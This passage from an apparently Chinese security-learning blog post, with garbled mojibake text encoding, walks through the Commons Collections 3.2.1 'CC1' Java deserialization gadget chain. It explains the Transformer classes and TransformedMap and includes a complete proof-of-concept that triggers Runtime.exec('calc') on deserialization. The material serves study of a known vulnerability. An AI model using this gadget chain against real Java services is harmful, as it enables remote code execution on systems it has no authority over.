title="3.1ç¯å¢ƒæ­å»º"></a>3.1ç¯å¢ƒæ­å»º</h3><p>å…·ä½“æ­å»ºå¯ä»¥å‚è€ƒbilibiliçš„ç™½æ—¥æ¢¦ç»„é•¿ã€‚</p><p>å°±æ˜¯å°†ä¸‹è½½jdk  8u71ä»¥ä¸‹çš„ç‰ˆæœ¬ï¼Œç„¶ååœ¨ä¸‹è½½å¯¹åº”çš„openjdkå°†é‡Œé¢çš„sunåŒ…å¤åˆ¶è¿‡æ¥ï¼Œç„¶åæ³¨æ„Commons-Collectionsçš„ç‰ˆæœ¬ä¸º3.2.1ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-2å‡½æ•°ä»‹ç»"><a href="#3-2å‡½æ•°ä»‹ç»" class="headerlink" title="3.2å‡½æ•°ä»‹ç»"></a>3.2å‡½æ•°ä»‹ç»</h3><h4 id="3-2-1Transformer"><a href="#3-2-1Transformer" class="headerlink" title="3.2.1Transformer"></a>3.2.1Transformer</h4><p>Transformeræ˜¯ä¸€ä¸ªæ¥å£ï¼Œåªæœ‰ä¸€ä¸ªå¸¦å®ç°çš„æ–¹æ³•ï¼›<br>TransformedMapåœ¨è½¬æ¢Mapçš„æ–°å…ƒç´ æ—¶ï¼Œå°±ä¼šè°ƒâ½¤transformâ½…æ³•ï¼Œè¿™ä¸ªè¿‡ç¨‹å°±ç±»ä¼¼åœ¨è°ƒâ½¤â¼€ä¸ªâ€œå›è°ƒ<br>å‡½æ•°â€ï¼Œè¿™ä¸ªå›è°ƒçš„å‚æ•°æ˜¯åŸå§‹å¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-2-2InvokerTransformer"><a href="#3-2-2InvokerTransformer" class="headerlink" title="3.2.2InvokerTransformer"></a>3.2.2InvokerTransformer</h4><p><font style="color:rgb(51, 51, 51);">InvokerTransformeræ˜¯å®ç°äº†Transformerã€Serializableæ¥â¼çš„â¼€ä¸ªç±»ï¼Œè¿™ä¸ªç±»å¯ä»¥â½¤æ¥æ‰§â¾ä»»æ„â½…æ³•ï¼Œè¿™ä¹Ÿæ˜¯ååº<br></font>åˆ—åŒ–èƒ½æ‰§â¾ä»»æ„ä»£ç çš„å…³é”®ï¼›</p><p>åœ¨å®ä¾‹åŒ–è¿™ä¸ªInvokerTransformeræ—¶ï¼Œéœ€è¦ä¼ â¼Šä¸‰ä¸ªå‚æ•°ï¼š</p><ul><li>ç¬¬â¼€ä¸ªå‚æ•°æ˜¯å¾…æ‰§â¾çš„â½…æ³•å</li><li>ç¬¬â¼†ä¸ªå‚æ•°æ˜¯è¿™ä¸ªå‡½æ•°çš„å‚æ•°åˆ—è¡¨çš„å‚æ•°ç±»å‹</li><li>ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ä¼ ç»™è¿™ä¸ªå‡½æ•°çš„å‚æ•°åˆ—è¡¨</li></ul><p>åé¢transformæ–¹æ³•ï¼Œé€šè¿‡åå°„è°ƒç”¨æ‰§è¡Œäº†inputå¯¹è±¡çš„iMethodNameæ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Transforms the input to result by invoking a method on the input.</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> input  the input object to transform</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the transformed result, null if null input</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">                </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h4 id="3-2-3ChainedTransformer"><a href="#3-2-3ChainedTransformer" class="headerlink" title="3.2.3ChainedTransformer"></a>3.2.3ChainedTransformer</h4><p>ChainedTransformeræ˜¯å®ç°äº†Transformerã€Serializableæ¥â¼çš„â¼€ä¸ªç±»ï¼Œå®ƒçš„ä½œâ½¤æ˜¯å°†å†…éƒ¨çš„å¤šä¸ªTransformerä¸²åœ¨â¼€èµ·ï¼Œå°†å‰ä¸€ä¸ªå›è°ƒè¿”å›çš„ç»“æœä½œä¸ºåä¸€ä¸ªçš„å‚æ•°ä¼ å…¥ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Transforms the input to result via each decorated transformer</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> object  the input object passed to the first transformer</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the transformed result</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">            object = iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="3-2-4ConstantTransformer"><a href="#3-2-4ConstantTransformer" class="headerlink" title="3.2.4ConstantTransformer"></a>3.2.4ConstantTransformer</h4><p>ConstantTransformeræ˜¯å®ç°äº†Transformerã€Serializableæ¥å£çš„ä¸€ä¸ªç±»ï¼Œå®ƒçš„è¿‡ç¨‹å°±æ˜¯åœ¨æ„é€ å‡½æ•°çš„æ—¶å€™ä¼ å…¥ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶åœ¨transformæ–¹æ³•å°†è¿™ä¸ªå¯¹è±¡å†è¿”å›ï¼›</p><p>ä½œç”¨å°±æ˜¯åŒ…è£…ä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œåœ¨æ‰§è¡Œå›è°ƒæ—¶è¿”å›è¿™ä¸ªå¯¹è±¡ï¼Œè¿›è€Œæ–¹ä¾¿åç»­æ“ä½œã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Transforms the input by ignoring it and returning the stored constant instead.</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> input  the input object which is ignored</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the stored constant</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3-2-5Transfomed"><a href="#3-2-5Transfomed" class="headerlink" title="3.2.5Transfomed"></a>3.2.5Transfomed</h4><p>TransformedMapâ½¤äºå¯¹Javaæ ‡å‡†æ•°æ®ç»“æ„Mapåšâ¼€ä¸ªä¿®é¥°ï¼Œè¢«ä¿®é¥°è¿‡çš„Mapåœ¨æ·»åŠ æ–°çš„å…ƒç´ æ—¶ï¼Œå°†å¯ä»¥æ‰§â¾â¼€ä¸ªå›è°ƒã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMap</span> <span class="keyword">extends</span> <span class="title class_">AbstractInputCheckedMapDecorator</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">        key = transformKey(key);</span><br><span class="line">        value = transformValue(value);</span><br><span class="line">        <span class="keyword">return</span> getMap().put(key, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">putAll</span><span class="params">(Map mapToCopy)</span> &#123;</span><br><span class="line">        mapToCopy = transformMap(mapToCopy);</span><br><span class="line">        getMap().putAll(mapToCopy);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="3-3è°ƒç”¨é“¾è¿‡ç¨‹"><a href="#3-3è°ƒç”¨é“¾è¿‡ç¨‹" class="headerlink" title="3.3è°ƒç”¨é“¾è¿‡ç¨‹"></a>3.3è°ƒç”¨é“¾è¿‡ç¨‹</h3><p>å…ˆæ¥çœ‹ä¸€ä¸‹Transfomedçš„poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//        //æ­£å¸¸è·å–runtimeå®ä¾‹</span></span><br><span class="line"><span class="comment">//        Runtime runtime = Runtime.getRuntime();</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//        //åå°„è·å– runtimeå®ä¾‹,å¹¶æ‰§è¡Œä»£ç </span></span><br><span class="line"><span class="comment">//        Class c = Runtime.class;</span></span><br><span class="line"><span class="comment">//        Method getRuntimeMethod = c.getMethod(&quot;getRuntime&quot;, null);</span></span><br><span class="line"><span class="comment">//        Runtime runtime = (Runtime) getRuntimeMethod.invoke(null, null);</span></span><br><span class="line"><span class="comment">//        Method execMethod = c.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">//        execMethod.invoke(runtime,&quot;calc&quot;);</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//        //InvokerTransformeræ–¹æ³•è·å–runtimeå®ä¾‹ï¼Œå¹¶æ‰§è¡Œä»£ç </span></span><br><span class="line"><span class="comment">//        Method  getRuntimeMethod = (Method) new InvokerTransformer(&quot;getRuntime&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.class);</span></span><br><span class="line"><span class="comment">//        Runtime runtime = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntimeMethod);</span></span><br><span class="line"><span class="comment">//        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(runtime);</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">//é€šè¿‡ChainedTransformerå®ç° InvokerTransformeræ–¹æ³•è·å–runtimeå®ä¾‹ï¼Œå¹¶æ‰§è¡Œä»£ç </span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"> </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//chainedTransformer.transform(Runtime.class);</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">//åˆ›å»ºæ„é€ å™¨</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">//ä¿è¯å¯ä»¥è®¿é—®åˆ°</span></span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//å®ä¾‹åŒ–ä¼ å‚ï¼Œæ³¨è§£å’Œæ„é€ å¥½çš„Map</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Target.class, transformedMap);</span><br><span class="line"> </span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶å®é€šè¿‡ä¸Šé¢çš„å‡½æ•°ä»‹ç»å¯ä»¥çŸ¥é“invokerTransformerä¸­çš„transformæ–¹æ³•å°±æ˜¯ä¸€ä¸ªå¯ä»¥è°ƒç”¨ä»»æ„ç±»ä¸­çš„æ–¹æ³•çš„ä¸€ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥å®ƒåœ¨è¿™é‡Œç®—æ˜¯æˆ‘ä»¬ååºåˆ—åŒ–æœ€ç»ˆæ‰§è¡Œçš„ç‚¹æ¥è¿›è¡Œæ¶æ„æ“ä½œã€‚é‚£ä¹ˆä¸‹é¢æˆ‘ä»¬å°±éœ€è¦æ‰¾åˆ°ä¸€ä¸ªè°è°ƒç”¨äº†è¿™ä¸ªtransformæ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨åºåˆ—åŒ–çš„æ—¶å€™å°†è°ƒç”¨è¿™ä¸ªæ–¹æ³•çš„å¯¹è±¡ç»™æ”¹æˆinvokerTransformerå¯¹è±¡</p><p>æ‰€ä»¥ç¬¬ä¸€æ­¥æˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªè°ƒç”¨è¯¥æ–¹æ³•çš„å‡½æ•°æ˜¯TransformedMapä¸­çš„CheckSetValueæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714487775144-4f98f606-3add-4d77-ad37-f4daee4d213b.png"></p><p>é€šè¿‡å¯¹è¯¥ç±»çš„æ„é€ æ–¹æ³•çš„åˆ†æå¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¯ä»¥ä¼ å…¥ä¸‰ä¸ªå‚æ•°å…·ä½“å¦‚ä¸‹ä»£ç æ‰€ç¤º</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//æ¥å—ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªä¸ºMap,æˆ‘ä»¬å¯ä»¥ä¼ å…¥ä¹‹å‰è®²åˆ°çš„HashMap,ç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªå°±æ˜¯Transformeræˆ‘ä»¬éœ€è¦çš„äº†ï¼Œå¯æ§ã€‚</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ¥å—ä¸€ä¸ªå¯¹è±¡ç±»å‹çš„å‚æ•°</span></span><br><span class="line"><span class="comment">//è¿”å›valueTransformerå¯¹åº”çš„transformæ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿™é‡Œå°±éœ€è¦è®©valueTransformerä¸ºæˆ‘ä»¬ä¹‹å‰çš„invokerTransformerå¯¹è±¡</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨ä¼ å…¥valueTransformerè¿™ä¸ªå‚æ•°æ—¶è®©å…¶ä¸ºinvokerTransformerå¯¹è±¡ï¼Œä½†æ˜¯ç”±äºè¯¥ç±»æ˜¯protectedçš„ç±»å‹æ‰€ä»¥ä¸èƒ½ç›´æ¥å®ä¾‹åŒ–ï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°è¯¥ç±»ä¸­æœ‰ä¸€ä¸ªé™æ€æ–¹æ³• decorate()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">    